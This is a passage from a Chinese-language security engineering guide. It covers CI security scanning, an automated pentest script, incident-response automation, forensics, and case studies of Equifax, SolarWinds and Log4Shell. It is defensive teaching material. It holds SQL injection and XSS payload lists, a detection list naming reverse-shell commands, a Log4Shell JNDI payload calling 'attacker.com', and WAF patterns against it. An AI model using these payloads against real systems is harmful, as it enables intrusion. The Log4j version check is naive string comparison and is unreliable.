
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          command: test
          args: --severity-threshold=high

  # 3. SAST (靜態應用安全測試)
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/owasp-top-ten
            p/security-audit

  # 4. IaC 安全掃描
  iac-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Run tfsec
        uses: aquasecurity/tfsec-action@v1.0.0
        with:
          soft_fail: false

  # 5. Container 掃描
  container-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Build image
        run: docker build -t myapp:${{ github.sha }} .

      - name: Run Trivy
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: myapp:${{ github.sha }}
          format: 'sarif'
          output: 'trivy-results.sarif'
          severity: 'CRITICAL,HIGH'

      - name: Upload Trivy results
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: 'trivy-results.sarif'

  # 6. 部署 (只有通過所有安全檢查才執行)
  deploy:
    needs: [secret-scanning, dependency-scan, sast, iac-scan, container-scan]
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
      - name: Deploy to production
        run: |
          echo "All security checks passed!"
          # 部署邏輯...
```

### 8.4 自動化安全測試

**DAST (動態應用安全測試) with OWASP ZAP**:

```yaml
# zap-scan.yml
name: DAST Scan

on:
  schedule:
    - cron: '0 2 * * *'  # 每天凌晨 2 點

jobs:
  zap-scan:
    runs-on: ubuntu-latest
    steps:
      - name: ZAP Baseline Scan
        uses: zaproxy/action-baseline@v0.7.0
        with:
          target: 'https://staging.myapp.com'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a'

      - name: ZAP Full Scan
        uses: zaproxy/action-full-scan@v0.4.0
        with:
          target: 'https://staging.myapp.com'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-j'  # AJAX spider

      - name: Upload ZAP Report
        uses: actions/upload-artifact@v3
        with:
          name: zap-report
          path: |
            report_html.html
            report_json.json
```

**自動化 Penetration Testing**:

```javascript
// automated-pentest.js
const puppeteer = require('puppeteer');
const axios = require('axios');

class AutomatedPenTest {
  constructor(baseUrl) {
    this.baseUrl = baseUrl;
    this.vulnerabilities = [];
  }

  // SQL Injection 測試
  async testSQLInjection() {
    const payloads = [
      "' OR '1'='1",
      "1' OR '1'='1' --",
      "admin' --",
      "' UNION SELECT NULL--"
    ];

    for (const payload of payloads) {
      try {
        const response = await axios.post(`${this.baseUrl}/api/login`, {
          email: payload,
          password: 'test'
        });

        if (response.status === 200) {
          this.vulnerabilities.push({
            type: 'SQL Injection',
            severity: 'CRITICAL',
            endpoint: '/api/login',
            payload: payload,
            description: 'SQL injection vulnerability detected'
          });
        }
      } catch (err) {
        // Expected failures
      }
    }
  }

  // XSS 測試
  async testXSS() {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();

    const payloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg/onload=alert("XSS")>'
    ];

    // 監聽 alert dialog
    page.on('dialog', async dialog => {
      this.vulnerabilities.push({
        type: 'XSS',
        severity: 'HIGH',
        description: 'Cross-Site Scripting vulnerability detected',
        payload: dialog.message()
      });
      await dialog.dismiss();
    });

    for (const payload of payloads) {
      await page.goto(`${this.baseUrl}/search?q=${encodeURIComponent(payload)}`);
      await page.waitForTimeout(1000);
    }

    await browser.close();
  }

  // CSRF 測試
  async testCSRF() {
    // 測試是否缺少 CSRF token
    try {
      const response = await axios.post(
        `${this.baseUrl}/api/users/delete`,
        { userId: 123 },
        {
          headers: {
            'Cookie': 'session=test-session'
          }
        }
      );

      if (response.status === 200) {
        this.vulnerabilities.push({
          type: 'CSRF',
          severity: 'HIGH',
          endpoint: '/api/users/delete',
          description: 'Missing CSRF protection'
        });
      }
    } catch (err) {
      // Expected failure
    }
  }

  // 生成報告
  generateReport() {
    const report = {
      scanDate: new Date().toISOString(),
      target: this.baseUrl,
      vulnerabilities: this.vulnerabilities,
      summary: {
        total: this.vulnerabilities.length,
        critical: this.vulnerabilities.filter(v => v.severity === 'CRITICAL').length,
        high: this.vulnerabilities.filter(v => v.severity === 'HIGH').length
      }
    };

    console.log(JSON.stringify(report, null, 2));

    return report;
  }

  async run() {
    console.log(`Starting automated penetration test on ${this.baseUrl}...`);

    await this.testSQLInjection();
    await this.testXSS();
    await this.testCSRF();

    return this.generateReport();
  }
}

// 執行測試
(async () => {
  const penTest = new AutomatedPenTest('https://staging.myapp.com');
  const report = await penTest.run();

  if (report.summary.critical > 0) {
    console.error('❌ Critical vulnerabilities found!');
    process.exit(1);
  }
})();
```

---

## Part 9: 安全事件響應

### 9.1 事件響應計劃

```yaml
安全事件響應生命週期 (NIST SP 800-61):

1. 準備 (Preparation)
   - 建立 IR 團隊
   - 定義事件分級
   - 準備工具和 Playbooks

2. 檢測與分析 (Detection & Analysis)
   - 監控告警
   - 初步分析
   - 確認事件嚴重性

3. 遏制、根除與恢復 (Containment, Eradication & Recovery)
   - 短期遏制 (隔離受影響系統)
   - 長期遏制 (修補漏洞)
   - 根除威脅
   - 恢復服務

4. 事後活動 (Post-Incident Activity)
   - 事後檢討
   - 更新 Playbooks
   - 改進防禦
```

**事件嚴重性分級**:

```yaml
# incident-severity.yml
severity_levels:
  P0_CRITICAL:
    description: "資料洩露、服務全面中斷、正在進行的攻擊"
    response_time: "15 分鐘內響應"
    escalation: "立即通知 CISO 和 CEO"
    examples:
      - 生產資料庫被刪除
      - 客戶信用卡資料洩露
      - Ransomware 攻擊
      - DDoS 導致全站宕機

  P1_HIGH:
    description: "潛在資料洩露、部分服務中斷"
    response_time: "1 小時內響應"
    escalation: "通知安全團隊主管"
    examples:
      - 檢測到未授權存取
      - Malware 感染
      - 重要系統異常行為

  P2_MEDIUM:
    description: "安全控制失效、可疑活動"
    response_time: "4 小時內響應"
    escalation: "通知值班工程師"
    examples:
      - 失敗的登入嘗試激增
      - 安全掃描發現高危漏洞
      - 配置偏離基線

  P3_LOW:
    description: "資訊性事件、低風險問題"
    response_time: "1 工作日內響應"
    escalation: "記錄到 ticket system"
    examples:
      - 安全政策違規
      - 低危漏洞
      - 培訓需求
```

### 9.2 自動化事件響應

**SOAR (Security Orchestration, Automation and Response) 實作**:

```javascript
class IncidentResponse {
  constructor() {
    this.slackWebhook = process.env.SLACK_INCIDENT_WEBHOOK;
    this.pagerdutyApiKey = process.env.PAGERDUTY_API_KEY;
  }

  // 事件處理 Orchestrator
  async handleIncident(incident) {
    console.log(`🚨 Incident detected: ${incident.type}`);

    // 1. 事件分類
    const severity = this.classifyIncident(incident);
    incident.severity = severity;

    // 2. 自動遏制措施
    await this.containIncident(incident);

    // 3. 通知相關人員
    await this.notifyStakeholders(incident);

    // 4. 收集證據
    await this.collectEvidence(incident);

    // 5. 執行 Playbook
    await this.executePlaybook(incident);

    // 6. 記錄事件
    await this.logIncident(incident);
  }

  // 事件分類
  classifyIncident(incident) {
    const rules = {
      'data_breach': 'P0_CRITICAL',
      'ransomware': 'P0_CRITICAL',
      'ddos_attack': 'P0_CRITICAL',
      'unauthorized_access': 'P1_HIGH',
      'malware': 'P1_HIGH',
      'brute_force': 'P2_MEDIUM',
      'vuln_scan': 'P3_LOW'
    };

    return rules[incident.type] || 'P3_LOW';
  }

  // 自動遏制
  async containIncident(incident) {
    switch (incident.type) {
      case 'brute_force':
        // 封鎖攻擊 IP
        await this.blockIP(incident.sourceIP);
        console.log(`✅ Blocked IP: ${incident.sourceIP}`);
        break;

      case 'unauthorized_access':
        // 撤銷用戶 token
        await this.revokeUserTokens(incident.userId);
        // 強制重設密碼
        await this.forcePasswordReset(incident.userId);
        console.log(`✅ Revoked access for user: ${incident.userId}`);
        break;

      case 'malware':
        // 隔離受感染的容器
        await this.quarantinePod(incident.podName);
        console.log(`✅ Quarantined pod: ${incident.podName}`);
        break;

      case 'data_breach':
        // 斷開受影響資料庫的外部連接
        await this.isolateDatabase(incident.databaseName);
        console.log(`✅ Isolated database: ${incident.databaseName}`);
        break;
    }
  }

  // 封鎖 IP (使用 AWS WAF)
  async blockIP(ip) {
    const AWS = require('aws-sdk');
    const waf = new AWS.WAFV2({ region: 'us-east-1' });

    const ipSet = await waf.getIPSet({
      Name: 'BlockedIPs',
      Scope: 'CLOUDFRONT',
      Id: process.env.WAF_IPSET_ID
    }).promise();

    const updatedAddresses = [...ipSet.IPSet.Addresses, `${ip}/32`];

    await waf.updateIPSet({
      Name: 'BlockedIPs',
      Scope: 'CLOUDFRONT',
      Id: process.env.WAF_IPSET_ID,
      Addresses: updatedAddresses,
      LockToken: ipSet.LockToken
    }).promise();
  }

  // 隔離 Kubernetes Pod
  async quarantinePod(podName) {
    const k8s = require('@kubernetes/client-node');
    const kc = new k8s.KubeConfig();
    kc.loadFromDefault();
    const k8sApi = kc.makeApiClient(k8s.CoreV1Api);

    // 添加隔離標籤
    await k8sApi.patchNamespacedPod(
      podName,
      'production',
      {
        metadata: {
          labels: {
            'security.quarantine': 'true'
          }
        }
      },
      undefined,
      undefined,
      undefined,
      undefined,
      { headers: { 'Content-Type': 'application/strategic-merge-patch+json' } }
    );

    // 使用 NetworkPolicy 阻斷流量
    const networkPolicy = {
      apiVersion: 'networking.k8s.io/v1',
      kind: 'NetworkPolicy',
      metadata: {
        name: `quarantine-${podName}`,
        namespace: 'production'
      },
      spec: {
        podSelector: {
          matchLabels: {
            'security.quarantine': 'true'
          }
        },
        policyTypes: ['Ingress', 'Egress'],
        ingress: [],  // 阻斷所有入站
        egress: []    // 阻斷所有出站
      }
    };

    const k8sNetworkApi = kc.makeApiClient(k8s.NetworkingV1Api);
    await k8sNetworkApi.createNamespacedNetworkPolicy('production', networkPolicy);
  }

  // 通知
  async notifyStakeholders(incident) {
    // Slack 通知
    await axios.post(this.slackWebhook, {
      text: `🚨 Security Incident Detected`,
      attachments: [{
        color: incident.severity === 'P0_CRITICAL' ? 'danger' : 'warning',
        fields: [
          { title: 'Type', value: incident.type, short: true },
          { title: 'Severity', value: incident.severity, short: true },
          { title: 'Description', value: incident.description },
          { title: 'Time', value: new Date().toISOString(), short: true }
        ]
      }]
    });

    // PagerDuty 告警 (P0/P1)
    if (incident.severity === 'P0_CRITICAL' || incident.severity === 'P1_HIGH') {
      await axios.post(
        'https://api.pagerduty.com/incidents',
        {
          incident: {
            type: 'incident',
            title: `${incident.severity}: ${incident.type}`,
            service: {
              id: process.env.PAGERDUTY_SERVICE_ID,
              type: 'service_reference'
            },
            urgency: incident.severity === 'P0_CRITICAL' ? 'high' : 'low',
            body: {
              type: 'incident_body',
              details: JSON.stringify(incident)
            }
          }
        },
        {
          headers: {
            'Authorization': `Token token=${this.pagerdutyApiKey}`,
            'Content-Type': 'application/json'
          }
        }
      );
    }
  }

  // 執行 Playbook
  async executePlaybook(incident) {
    const playbook = this.getPlaybook(incident.type);

    for (const step of playbook.steps) {
      console.log(`Executing step: ${step.action}`);

      try {
        await step.execute(incident);
        step.status = 'completed';
      } catch (err) {
        console.error(`Step failed: ${step.action}`, err);
        step.status = 'failed';
        step.error = err.message;
      }
    }
  }

  // Playbook 定義
  getPlaybook(incidentType) {
    const playbooks = {
      'data_breach': {
        steps: [
          {
            action: 'Isolate affected systems',
            execute: async (incident) => {
              await this.isolateDatabase(incident.databaseName);
            }
          },
          {
            action: 'Identify scope of breach',
            execute: async (incident) => {
              // 查詢受影響的記錄
              const affectedRecords = await db.auditLogs.find({
                timestamp: { $gte: incident.startTime },
                action: 'SELECT',
                userId: { $in: incident.suspiciousUsers }
              });
              incident.affectedRecordCount = affectedRecords.length;
            }
          },
          {
            action: 'Notify affected users',
            execute: async (incident) => {
              // 發送通知郵件
              await this.notifyAffectedUsers(incident);
            }
          },
          {
            action: 'File regulatory report',
            execute: async (incident) => {
              // GDPR requires notification within 72 hours
              await this.fileGDPRReport(incident);
            }
          }
        ]
      }
    };

    return playbooks[incidentType] || { steps: [] };
  }
}

// 使用範例
const ir = new IncidentResponse();

// 檢測到暴力破解攻擊
await ir.handleIncident({
  type: 'brute_force',
  sourceIP: '192.168.1.100',
  targetUser: 'admin@example.com',
  attemptCount: 150,
  description: 'Multiple failed login attempts detected'
});
```

### 9.3 數位取證

```javascript
class ForensicsCollector {
  // 收集系統快照
  async collectSnapshot(instanceId) {
    const snapshot = {
      timestamp: new Date().toISOString(),
      instanceId: instanceId,
      data: {}
    };

    // 1. 記憶體 Dump
    snapshot.data.memory = await this.dumpMemory(instanceId);

    // 2. 磁碟快照
    snapshot.data.disk = await this.createDiskSnapshot(instanceId);

    // 3. 網路連接
    snapshot.data.network = await this.captureNetworkState(instanceId);

    // 4. 執行中的 Processes
    snapshot.data.processes = await this.listProcesses(instanceId);

    // 5. 系統日誌
    snapshot.data.logs = await this.collectLogs(instanceId);

    // 6. 計算雜湊值 (確保證據完整性)
    snapshot.hash = this.calculateHash(JSON.stringify(snapshot.data));

    return snapshot;
  }

  // 日誌分析
  async analyzeLogsForIOC(logs) {
    const indicators = {
      suspiciousIPs: [],
      maliciousFiles: [],
      anomalousCommands: []
    };

    // 檢測可疑 IP
    const ipPattern = /\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/g;
    for (const log of logs) {
      const ips = log.message.match(ipPattern) || [];
      for (const ip of ips) {
        if (await this.isSuspiciousIP(ip)) {
          indicators.suspiciousIPs.push(ip);
        }
      }
    }

    // 檢測可疑命令
    const suspiciousCommands = [
      'wget',
      'curl',
      'nc -e',
      '/bin/bash -i',
      'base64 -d',
      'python -c'
    ];

    for (const log of logs) {
      for (const cmd of suspiciousCommands) {
        if (log.message.includes(cmd)) {
          indicators.anomalousCommands.push({
            command: cmd,
            log: log,
            timestamp: log.timestamp
          });
        }
      }
    }

    return indicators;
  }

  calculateHash(data) {
    return crypto.createHash('sha256').update(data).digest('hex');
  }
}
```

---

## Part 10: 真實案例研究

### 案例 1: Equifax 資料洩露事件 (2017)

**事件概要**:
- 1.47 億用戶個資洩露
- 攻擊者利用 Apache Struts 漏洞 (CVE-2017-5638)
- 從入侵到發現長達 76 天

**根本原因**:

```yaml
技術失誤:
  1. 未及時修補已知漏洞:
     - CVE-2017-5638 公開後 2 個月仍未修補
     - 漏洞掃描工具未涵蓋該系統

  2. 網路分段不足:
     - 攻擊者從 Web 伺服器橫向移動到資料庫
     - 未實施最小權限原則

  3. 加密不足:
     - 敏感資料未加密儲存
     - 傳輸中也未使用 TLS

  4. 監控失效:
     - SSL 憑證過期導致監控工具失效
     - 異常流量未被檢測

流程失誤:
  - 補丁管理流程不完善
  - 事件響應計劃未演練
  - 缺乏資料洩露檢測機制
```

**防範措施**:

```javascript
// 1. 自動化漏洞管理
class VulnerabilityManagement {
  async scanAndPatch() {
    // 掃描依賴漏洞
    const vulns = await this.scanDependencies();

    // 依據嚴重性排序
    const criticalVulns = vulns.filter(v => v.severity === 'CRITICAL');

    // 自動建立補丁 ticket
    for (const vuln of criticalVulns) {
      await this.createPatchTicket({
        cve: vuln.cve,
        package: vuln.package,
        fixedVersion: vuln.fixedVersion,
        sla: '24 hours'  // P0 漏洞 24 小時內修復
      });
    }
  }
}

// 2. 資料加密
class DataProtection {
  // 欄位級加密
  async encryptSensitiveFields(userData) {
    return {
      ...userData,
      ssn: await this.encrypt(userData.ssn),  // 社會安全號碼
      creditCard: await this.encrypt(userData.creditCard),
      dob: await this.encrypt(userData.dob)  // 生日
    };
  }
}

// 3. 異常檢測
class AnomalyDetection {
  async detectDataExfiltration() {
    const metrics = await this.getNetworkMetrics();

    // 檢測異常大量資料傳輸
    if (metrics.outboundBytes > this.baseline * 3) {
      await this.triggerAlert({
        type: 'data_exfiltration',
        severity: 'P0_CRITICAL',
        description: `Abnormal outbound traffic: ${metrics.outboundBytes} bytes`
      });
    }
  }
}
```

---

### 案例 2: SolarWinds 供應鏈攻擊 (2020)

**事件概要**:
- 攻擊者入侵 SolarWinds Orion 平台的建置系統
- 在軟體更新中植入後門 (SUNBURST)
- 影響 18,000 個客戶,包括美國政府機構

**攻擊鏈**:

```yaml
階段 1: 初始入侵
  - 攻擊者取得 SolarWinds 內部網路存取權
  - 可能透過密碼噴灑或釣魚攻擊

階段 2: 建置系統植入
  - 修改 Orion 建置腳本
  - 注入惡意代碼到 SolarWinds.Orion.Core.BusinessLayer.dll

階段 3: 供應鏈投毒
  - 惡意更新透過官方管道分發
  - 使用合法數位簽章,繞過檢測

階段 4: 受害者感染
  - 客戶安裝官方更新
  - 後門在受害者環境中激活

階段 5: 橫向移動與資料竊取
  - C2 通訊偽裝成正常 Orion 流量
  - 竊取憑證和敏感資料
```

**防範措施**:

```javascript
// 1. 建置系統安全強化
class BuildPipelineSecurity {
  async secureBuild() {
    // 隔離建置環境
    await this.isolateBuildEnvironment();

    // 程式碼簽署
    await this.signArtifacts();

    // 產生 SBOM (Software Bill of Materials)
    const sbom = await this.generateSBOM();

    // 驗證所有依賴
    await this.verifyDependencies(sbom);
  }

  // 產生 SBOM
  async generateSBOM() {
    const { execSync } = require('child_process');

    // 使用 Syft 生成 SBOM
    execSync('syft packages dir:. -o json > sbom.json');

    const sbom = JSON.parse(fs.readFileSync('sbom.json'));

    // 簽署 SBOM
    const signature = this.signDocument(JSON.stringify(sbom));

    return { sbom, signature };
  }

  // 驗證建置產物完整性
  async verifyBuildIntegrity(artifact) {
    // 1. 驗證數位簽章
    const signatureValid = await this.verifySignature(artifact);
    if (!signatureValid) {
      throw new Error('Invalid signature');
    }

    // 2. 對照 SBOM
    const declaredHash = artifact.sbom.hash;
    const actualHash = this.calculateHash(artifact.binary);

    if (declaredHash !== actualHash) {
      throw new Error('Hash mismatch - possible tampering');
    }

    // 3. 檢查可重現建置
    const rebuiltArtifact = await this.rebuild(artifact.sourceCommit);
    if (rebuiltArtifact.hash !== actualHash) {
      throw new Error('Build not reproducible - possible backdoor');
    }

    return true;
  }
}

// 2. 供應鏈安全掃描
class SupplyChainSecurity {
  async validateDependency(packageName, version) {
    // 檢查已知惡意套件
    const isMalicious = await this.checkMaliciousPackageDB(packageName);
    if (isMalicious) {
      throw new Error(`Malicious package detected: ${packageName}`);
    }

    // 檢查 Typosquatting
    const isSuspicious = this.detectTyposquatting(packageName);
    if (isSuspicious) {
      console.warn(`⚠️  Suspicious package name: ${packageName}`);
    }

    // 檢查套件維護狀態
    const maintainerInfo = await this.getPackageMaintainer(packageName);
    if (maintainerInfo.lastUpdate > 365) {  // 超過 1 年未更新
      console.warn(`⚠️  Package not maintained: ${packageName}`);
    }

    // 檢查下載量異常
    const downloadStats = await this.getDownloadStats(packageName);
    if (this.isAnomalousDownloadPattern(downloadStats)) {
      console.warn(`⚠️  Anomalous download pattern: ${packageName}`);
    }
  }

  detectTyposquatting(packageName) {
    const popularPackages = ['express', 'react', 'lodash', 'axios'];

    for (const popular of popularPackages) {
      const distance = this.levenshteinDistance(packageName, popular);

      // 編輯距離 <= 2 可能是 typosquatting
      if (distance <= 2 && packageName !== popular) {
        return true;
      }
    }

    return false;
  }
}

// 3. Runtime 檢測
class RuntimeSecurity {
  async monitorBehavior() {
    // 檢測異常網路連接
    const connections = await this.getNetworkConnections();

    for (const conn of connections) {
      // 檢查是否連接到已知 C2 伺服器
      if (await this.isKnownC2Server(conn.remoteIP)) {
        await this.blockConnection(conn);
        await this.triggerIncident({
          type: 'c2_communication',
          severity: 'P0_CRITICAL',
          details: conn
        });
      }
    }
  }
}
```

**供應鏈安全檢查清單**:

```yaml
開發階段:
  - ✅ 使用可信任的依賴來源 (官方 registry)
  - ✅ 鎖定依賴版本 (package-lock.json)
  - ✅ 定期掃描依賴漏洞 (npm audit, Snyk)
  - ✅ 檢查套件授權合規性
  - ✅ 驗證套件維護者身份

建置階段:
  - ✅ 隔離建置環境
  - ✅ 使用 immutable 建置映像
  - ✅ 產生和簽署 SBOM
  - ✅ 可重現建置 (reproducible builds)
  - ✅ 多方驗證建置產物

發布階段:
  - ✅ 數位簽章所有產物
  - ✅ 使用安全的發布管道
  - ✅ 版本控制和審計日誌
  - ✅ 漸進式部署 (Canary/Blue-Green)

運行階段:
  - ✅ Runtime Application Self-Protection (RASP)
  - ✅ 異常行為檢測
  - ✅ 網路流量監控
  - ✅ 定期安全審計
```

---

### 案例 3: Log4Shell 漏洞 (2021)

**事件概要**:
- Apache Log4j 遠端代碼執行漏洞 (CVE-2021-44228)
- CVSS 評分 10.0 (最高嚴重性)
- 影響範圍極廣,數百萬應用受影響

**漏洞原理**:

```java
// Log4j JNDI Lookup 漏洞
// 攻擊者可以透過日誌訊息觸發 JNDI lookup

// 攻擊範例
String userInput = "${jndi:ldap://attacker.com/Evil}";
logger.info("User input: " + userInput);

// Log4j 會:
// 1. 解析 ${jndi:...} 表達式
// 2. 連接到 attacker.com 的 LDAP 伺服器
// 3. 下載並執行惡意 Java class
```

**緊急應對措施**:

```javascript
// 1. 快速檢測受影響的系統
class Log4jScanner {
  async scanForVulnerableVersions() {
    // 掃描檔案系統
    const jars = await glob('**/*.jar');

    for (const jar of jars) {
      if (await this.containsLog4j(jar)) {
        const version = await this.extractLog4jVersion(jar);

        if (this.isVulnerable(version)) {
          console.log(`❌ Vulnerable: ${jar} (version ${version})`);

          await this.reportVulnerableJar({
            path: jar,
            version: version,
            cve: 'CVE-2021-44228'
          });
        }
      }
    }
  }

  isVulnerable(version) {
    // 2.0-beta9 <= version < 2.15.0 are vulnerable
    const vulnerableRange = ['2.0', '2.14.1'];
    return version >= vulnerableRange[0] && version <= vulnerableRange[1];
  }
}

// 2. 緊急緩解措施 (在升級前)
class Log4jMitigation {
  // WAF 規則阻擋攻擊
  async deployWAFRules() {
    const wafRule = {
      name: 'Block-Log4j-JNDI-Lookup',
      priority: 1,
      statement: {
        regexPatternSet: {
          regex: '\\$\\{jndi:(ldap|ldaps|rmi|dns)://.*\\}'
        }
      },
      action: {
        block: {}
      }
    };

    await this.updateWAF(wafRule);
  }

  // 環境變數緩解 (臨時措施)
  applyEnvironmentMitigation() {
    // 禁用 JNDI lookup
    process.env.LOG4J_FORMAT_MSG_NO_LOOKUPS = 'true';

    // 或移除 JndiLookup class
    // zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
  }
}

// 3. 持續監控
class Log4jMonitoring {
  async monitorForExploitAttempts() {
    // 掃描日誌中的攻擊模式
    const logs = await this.getLogs();

    const attackPatterns = [
      /\$\{jndi:ldap:\/\//,
      /\$\{jndi:rmi:\/\//,
      /\$\{jndi:dns:\/\//,
      /\$\{lower:j\}\$\{lower:n\}\$\{lower:d\}\$\{lower:i\}:/  // 混淆
    ];

    for (const log of logs) {
      for (const pattern of attackPatterns) {
        if (pattern.test(log.message)) {
          await this.triggerIncident({
            type: 'log4j_exploit_attempt',
            severity: 'P0_CRITICAL',
            sourceIP: log.sourceIP,
            payload: log.message,
            timestamp: log.timestamp
          });
        }
      }
    }
  }
}
```

**長期修復**:

```xml
<!-- pom.xml - 升級到安全版本 -->
<dependency>
  <groupId>org.apache.logging.log4j</groupId>
  <artifactId>log4j-core</artifactId>
  <version>2.17.1</version>  <!-- 已修復 -->
</dependency>
```

---

## 總結

本深度技術指南涵蓋了安全工程的進階主題:

✅ **威脅建模** - STRIDE 方法、風險評估
✅ **OWASP Top 10** - 注入攻擊、存取控制、密碼學失敗
✅ **認證授權** - JWT 安全、MFA、ABAC
✅ **密碼學實踐** - 加密、數位簽章
✅ **容器安全** - Docker、Kubernetes 安全強化
✅ **零信任架構** - 持續驗證、最小權限
✅ **Secrets 管理** - HashiCorp Vault、輪換策略
✅ **Security as Code** - IaC 掃描、OPA、GitOps 安全
✅ **事件響應** - SOAR 自動化、數位取證
✅ **真實案例** - Equifax、SolarWinds、Log4Shell 深度分析

### 關鍵要點

1. **縱深防禦 (Defense in Depth)**: 多層安全控制
2. **零信任原則**: 永不信任,始終驗證
3. **自動化**: Security as Code,自動化檢測和響應
4. **持續監控**: 實時威脅檢測和異常分析
5. **供應鏈安全**: 從開發到生產的完整安全
6. **事件準備**: Playbooks、演練、快速響應

---

## 📚 延伸閱讀

- 📘 [Security SOP 完整版](./SOP.md)
- ⚡ [Security QuickRef 快速參考](./SOP_QuickRef.md)
- 🚀 [Security 快速啟動指令集](../../prompts/scenario-prompts/security-prompts.md)
- 🔧 [Security Assessment Workflow](../../workflow/scenario-specific/security-assessment-flow.md)
- 📄 [AISDLC_INIT.md](../../AISDLC_INIT.md)

### 相關 Agents
- [security-engineer-zh.yaml](../../agent/specialized/security-engineer-zh.yaml) - Security Engineer（主導）
- [compliance-officer-zh.yaml](../../agent/specialized/compliance-officer-zh.yaml) - Compliance Officer（合規審查）
- [qa-lead-zh.yaml](../../agent/specialized/qa-lead-zh.yaml) - QA Lead（安全測試策略）
- [04.sa-analyst-zh.yaml](../../agent/core/04.sa-analyst-zh.yaml) - Amanda（威脅建模資料流圖）
- [05.sd-architect-zh.yaml](../../agent/core/05.sd-architect-zh.yaml) - Marcus（安全架構設計）
- [dev-senior-zh.yaml](../../agent/specialized/dev-senior-zh.yaml) - Dev Senior（安全加固實施）
- [devops-engineer-zh.yaml](../../agent/specialized/devops-engineer-zh.yaml) - DevOps（安全 CI/CD Pipeline）
- [sd-mobile-architect-zh.yaml](../../agent/specialized/sd-mobile-architect-zh.yaml) - Mobile Architect（選用）
- [qa-mobile-tester-zh.yaml](../../agent/specialized/qa-mobile-tester-zh.yaml) - Mobile QA（選用）
- [qa-web-tester-zh.yaml](../../agent/specialized/qa-web-tester-zh.yaml) - Web QA（選用）

### 相關 Skills
- `/security-audit` - OWASP Top 10 安全審計
- `/compliance-audit` - GDPR/PCI-DSS/SOC2/ISO 27001 合規審查
- `/sd-architect` - 安全架構設計（Zero Trust、加密策略）
- `/code-review` - 安全程式碼審查（漏洞檢測）
- `/qa-testing` - 安全測試策略與案例設計
- `/testing-strategy` - 安全測試金字塔設計
- `/integration-oauth` - OAuth 2.0/OIDC 認證整合
- `/integration-database` - 資料庫安全（PostgreSQL 加密、RLS）
- `/integration-redis` - Session/Token 安全快取
- `/devops-github-actions` - 安全 CI/CD Pipeline
- `/devops-docker` - 容器安全（Golden Image、Trivy）
- `/devops-monitoring` - 安全事件監控與告警
- `/mobile-development` - 行動端安全（Android/macOS）

---

**文檔版本: v0.01
**最後更新**: 2026-03-28
**維護者**: AISDLC Framework Team
